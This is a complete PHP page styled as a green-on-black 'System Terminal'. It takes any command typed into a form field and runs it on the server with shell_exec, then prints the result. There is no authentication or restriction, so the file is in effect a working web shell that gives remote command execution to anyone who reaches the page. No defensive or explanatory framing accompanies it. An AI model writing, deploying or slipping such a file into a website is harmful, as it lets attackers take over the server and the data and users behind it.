<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PHP Terminal</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        input { background: #000; color: #0f0; border: 1px solid #0f0; width: 80%; padding: 5px; }
        pre { background: #111; padding: 10px; border: 1px id #333; overflow-x: auto; }
    </style>
</head>
<body>
    <h1>System Terminal</h1>
    <form method="POST">
        <span>$ </span><input type="text" name="cmd" autofocus placeholder="Print command">
        <button type="submit" style="display:none"></button>
    </form>

    <pre>
<?php
if (isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $output = shell_exec($command);
    echo htmlspecialchars($output);
}
?>
    </pre>
</body>
</html>

